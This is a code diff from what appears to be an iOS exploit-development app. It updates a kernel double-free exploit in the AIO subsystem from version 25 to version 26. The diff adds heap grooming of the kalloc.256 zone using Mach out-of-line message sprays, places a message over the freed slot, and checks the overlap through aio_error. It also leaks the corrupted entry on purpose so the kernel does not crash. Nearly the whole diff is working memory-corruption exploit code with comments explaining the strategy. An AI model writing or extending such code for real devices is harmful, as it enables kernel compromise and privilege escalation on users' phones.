@@ -356,7 +356,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO Double-Free v25" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO Double-Free v26" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5742,7 +5742,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v25 =========="];
+    [self appendLog:@"\n========== AIO Double-Free v26 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5761,7 +5761,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:@"FAIL: could not create temp file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO Double-Free v25" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO Double-Free v26" forState:UIControlStateNormal];
         });
         return;
     }
@@ -5903,7 +5903,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     // the overlapped slot (byte-offset payload).
     // NO kevent, NO aio_return on overlapped entry → no crash.
 
-    [self appendLog:@"\n--- Phase D v25: 20x OOL spray ---"];
+    [self appendLog:@"\n--- Phase D v26: v20-style drain + overlap ---"];
 
     // OOL payload: byte-offset pattern for field mapping
     enum { kDrainOolSize = 256 };
@@ -5918,108 +5918,138 @@ static void *e2_free_and_ool_racer(void *arg) {
         mach_msg_ool_descriptor_t ool;
     } DrainMsg;
 
-    // Create 20 OOL spray ports (no drain — all used for overlap spray after E2)
-    enum { kOolPorts = 20 };
-    mach_port_t oolRecv[kOolPorts];
-    mach_port_t oolSend[kOolPorts];
-    int oolPortsReady = 0;
-    for (int p = 0; p < kOolPorts; p++) {
-        oolRecv[p] = MACH_PORT_NULL;
-        oolSend[p] = MACH_PORT_NULL;
-        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &oolRecv[p]) == KERN_SUCCESS) {
+    // ---- Phase D v26: v20-style drain + E2 + single OOL overlap ----
+    // Strategy: Pre-E2 drain of kalloc.256 (9 OOL msgs via 3 ports × 3 sends)
+    // changes freelist state so the double-freed slot moves closer to the
+    // magazine head. Then E2 claims one copy, single OOL hits the other.
+    // v20 proved this is safe (no crash). aio_error reads errorval.
+    // E2 uses nbytes=1 (fits in 256-byte buffer, no EFAULT like v25).
+
+    // Drain: 3 ports × 3 msgs = 9 OOL sends before E2
+    enum { kDrainPorts = 3, kDrainMsgs = 3 };
+    mach_port_t drainRecv[kDrainPorts];
+    mach_port_t drainSend[kDrainPorts];
+    int drainReady = 0;
+    for (int p = 0; p < kDrainPorts; p++) {
+        drainRecv[p] = MACH_PORT_NULL;
+        drainSend[p] = MACH_PORT_NULL;
+        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainRecv[p]) == KERN_SUCCESS) {
             mach_msg_type_name_t poly = 0;
-            if (mach_port_extract_right(mach_task_self_, oolRecv[p],
-                MACH_MSG_TYPE_MAKE_SEND, &oolSend[p], &poly) == KERN_SUCCESS) {
-                oolPortsReady++;
+            if (mach_port_extract_right(mach_task_self_, drainRecv[p],
+                MACH_MSG_TYPE_MAKE_SEND, &drainSend[p], &poly) == KERN_SUCCESS) {
+                drainReady++;
             } else {
-                mach_port_destroy(mach_task_self_, oolRecv[p]);
-                oolRecv[p] = MACH_PORT_NULL;
+                mach_port_destroy(mach_task_self_, drainRecv[p]);
+                drainRecv[p] = MACH_PORT_NULL;
             }
         }
     }
-    [self appendLog:[NSString stringWithFormat:@"  OOL spray ports: %d/%d ready", oolPortsReady, kOolPorts]];
+    [self appendLog:[NSString stringWithFormat:@"  Drain ports: %d/%d", drainReady, kDrainPorts]];
 
-    // ---- v22: E2 with SIGEV_NONE + 20x OOL spray via double-free overlap ----
-    // Forward cleanup freelist: [Y-second, rcbs[1..6], Y-first].
-    // E2 takes Y-second from head. 20 OOL sprays sweep rcbs[1..6] → Y-first.
-    // OOL #7 hits Y-first (same physical address) → OVERLAP confirmed.
-    // Post-overlap: aio_error ONLY (reads errorval @+0x28) — never aio_return
-    // because aio_return does TAILQ_REMOVE(entry->procp) → crash if corrupted.
+    int drainSent = 0;
+    for (int p = 0; p < drainReady; p++) {
+        for (int m = 0; m < kDrainMsgs; m++) {
+            DrainMsg msg;
+            memset(&msg, 0, sizeof(msg));
+            msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+            msg.header.msgh_size = sizeof(msg);
+            msg.header.msgh_remote_port = drainSend[p];
+            msg.header.msgh_id = (mach_msg_id_t)(100 + p * kDrainMsgs + m);
+            msg.body.msgh_descriptor_count = 1;
+            msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+            msg.ool.address = drainPayload;
+            msg.ool.size = kDrainOolSize;
+            msg.ool.deallocate = FALSE;
+            msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
+            if (mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
+                drainSent++;
+            }
+        }
+    }
+    [self appendLog:[NSString stringWithFormat:@"  Drain: %d/%d OOL msgs sent", drainSent, kDrainPorts * kDrainMsgs]];
+
+    // Create single overlap port
+    mach_port_t ovRecv = MACH_PORT_NULL, ovSend = MACH_PORT_NULL;
+    if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &ovRecv) == KERN_SUCCESS) {
+        mach_msg_type_name_t poly = 0;
+        if (mach_port_extract_right(mach_task_self_, ovRecv,
+            MACH_MSG_TYPE_MAKE_SEND, &ovSend, &poly) != KERN_SUCCESS) {
+            mach_port_destroy(mach_task_self_, ovRecv);
+            ovRecv = MACH_PORT_NULL;
+        }
+    }
+    [self appendLog:[NSString stringWithFormat:@"  Overlap port: %s", ovSend != MACH_PORT_NULL ? "ready" : "FAIL"]];
+
+    // E2: nbytes=1 into 256-byte buf — safe, no overflow (v25's 0xE2E2→EFAULT)
     {
         static struct aiocb e2;
         static char e2buf[256];
         memset(&e2, 0, sizeof(e2));
         e2.aio_fildes = fd;
         e2.aio_buf = e2buf;
-        e2.aio_nbytes = 0xE2E2;  // distinct marker — easy to spot if overlap misses
+        e2.aio_nbytes = 1;  // v26: safe — fits in buffer
         e2.aio_offset = 0;
         e2.aio_lio_opcode = LIO_READ;
-        e2.aio_sigevent.sigev_notify = SIGEV_NONE;  // NO kevent → no crash
+        e2.aio_sigevent.sigev_notify = SIGEV_NONE;
         int e2ok = (aio_read(&e2) == 0);
-        [self appendLog:[NSString stringWithFormat:@"  E2 aio_read(SIGEV_NONE): %@", e2ok ? @"OK" : @"FAIL"]];
-        if (e2ok && drainPayload && oolPortsReady > 0) {
+        [self appendLog:[NSString stringWithFormat:@"  E2 aio_read(nbytes=1): %@", e2ok ? @"OK" : @"FAIL"]];
+        if (e2ok && drainPayload && ovSend != MACH_PORT_NULL) {
             while (aio_error(&e2) == EINPROGRESS) usleep(100);
             [self appendLog:[NSString stringWithFormat:@"  E2 done, pre-spray aio_error=%d", aio_error(&e2)]];
 
-            // v22: 20 OOL sprays sweep through freelist. After forward cleanup,
-            // Y's two copies are 7 entries apart (rcbs[1..6] + Y-first).
-            // E2 took Y-second; sprays #1-6 consume rcbs[1..6]; spray #7 hits Y-first.
-            int oolSent = 0;
-            for (int p = 0; p < oolPortsReady; p++) {
-                DrainMsg ool;
-                memset(&ool, 0, sizeof(ool));
-                ool.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
-                ool.header.msgh_size = sizeof(ool);
-                ool.header.msgh_remote_port = oolSend[p];
-                ool.header.msgh_id = 0xE200 + p;
-                ool.body.msgh_descriptor_count = 1;
-                ool.ool.type = MACH_MSG_OOL_DESCRIPTOR;
-                ool.ool.address = drainPayload;
-                ool.ool.size = kDrainOolSize;
-                ool.ool.deallocate = FALSE;
-                ool.ool.copy = MACH_MSG_PHYSICAL_COPY;
-                if (mach_msg(&ool.header, MACH_SEND_MSG, sizeof(ool), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
-                    oolSent++;
-                }
-            }
-            [self appendLog:[NSString stringWithFormat:@"  OOL spray: %d/%d sent", oolSent, oolPortsReady]];
+            // Single OOL overlap — double-free puts slot S on freelist twice.
+            // E2 got first copy; OOL gets second → same physical address.
+            DrainMsg ool;
+            memset(&ool, 0, sizeof(ool));
+            ool.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+            ool.header.msgh_size = sizeof(ool);
+            ool.header.msgh_remote_port = ovSend;
+            ool.header.msgh_id = 0xE200;
+            ool.body.msgh_descriptor_count = 1;
+            ool.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+            ool.ool.address = drainPayload;
+            ool.ool.size = kDrainOolSize;
+            ool.ool.deallocate = FALSE;
+            ool.ool.copy = MACH_MSG_PHYSICAL_COPY;
+            kern_return_t okr = mach_msg(&ool.header, MACH_SEND_MSG, sizeof(ool), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+            [self appendLog:[NSString stringWithFormat:@"  OOL overlap send: kr=%d", okr]];
 
-            // v22: aio_error ONLY — reads errorval @+0x28 from entry.
-            // aio_error likely does NOT access procp (no TAILQ_REMOVE).
-            // If overlap succeeded, errorval = 0x2B2A2928 (byte-offset bytes @0x28-0x2B).
-            // If overlap missed, errorval = 0 (success) or original value.
-            // NEVER call aio_return — it does TAILQ_REMOVE(entry->procp) → crash.
+            // aio_error ONLY (no aio_return) — reads errorval @+0x28.
+            // If overlap succeeded: 0x2B2A2928 (byte-offset payload @0x28-0x2B).
+            // If overlap missed: errorval unchanged from completion.
             int err = aio_error(&e2);
             [self appendLog:[NSString stringWithFormat:@"  post-spray aio_error=%d (0x%08x)", err, (unsigned)err]];
 
             if (err == 0x2B2A2928) {
-                [self appendLog:@"  >> CONFIRMED: OOL overlap detected via aio_error! <<"];
-                [self appendLog:@"  >> errorval @+0x28 in AIO entry mapped <<"];
+                [self appendLog:@"  >> CONFIRMED: OOL overlap via aio_error! <<"];
+                [self appendLog:@"  >> errorval @+0x28 mapped <<"];
             } else if (err == 0) {
-                [self appendLog:@"  >> aio_error=0 — overlap missed, entry not corrupted <<"];
-            } else if (err == EINVAL) {
-                [self appendLog:@"  >> aio_error=EINVAL — entry lookup failed (TAILQ corruption?) <<"];
+                [self appendLog:@"  >> aio_error=0 — overlap missed <<"];
             } else if (err > 0 && err < 256) {
                 [self appendLog:[NSString stringWithFormat:@"  >> aio_error=0x%x — partial/shifted overlap <<", (unsigned)err]];
             } else {
-                [self appendLog:[NSString stringWithFormat:@"  >> aio_error=0x%x (%d) — unexpected, investigate <<", (unsigned)err, err]];
+                [self appendLog:[NSString stringWithFormat:@"  >> aio_error=0x%x — unexpected <<", (unsigned)err]];
             }
 
-            // v22: LEAK E2 entry (don't call aio_return) — avoids procp crash.
-            [self appendLog:@"  E2 entry intentionally leaked (aio_return skipped for safety)"];
+            // LEAK E2 entry — no aio_return to avoid TAILQ_REMOVE crash
+            [self appendLog:@"  E2 entry intentionally leaked (no aio_return)"];
         } else {
-            [self appendLog:[NSString stringWithFormat:@"  E2 SKIP: e2ok=%d payload=%p ports=%d", e2ok, drainPayload, oolPortsReady]];
+            [self appendLog:[NSString stringWithFormat:@"  E2 SKIP: e2ok=%d payload=%p ovSend=0x%x", e2ok, drainPayload, ovSend]];
             if (e2ok) {
                 while (aio_error(&e2) == EINPROGRESS) usleep(100);
-                aio_return(&e2);  // safe here — no overlap, valid entry
+                aio_return(&e2);
             }
         }
     }
 
-    // Destroy all OOL spray ports
-    for (int p = 0; p < oolPortsReady; p++) {
-        mach_port_destroy(mach_task_self_, oolRecv[p]);
-        mach_port_deallocate(mach_task_self_, oolSend[p]);
+    // Destroy drain + overlap ports
+    for (int p = 0; p < drainReady; p++) {
+        mach_port_destroy(mach_task_self_, drainRecv[p]);
+        mach_port_deallocate(mach_task_self_, drainSend[p]);
+    }
+    if (ovRecv != MACH_PORT_NULL) {
+        mach_port_destroy(mach_task_self_, ovRecv);
+        mach_port_deallocate(mach_task_self_, ovSend);
     }
     free(drainPayload);
 
@@ -6030,7 +6060,7 @@ static void *e2_free_and_ool_racer(void *arg) {
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO Double-Free v25" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO Double-Free v26" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
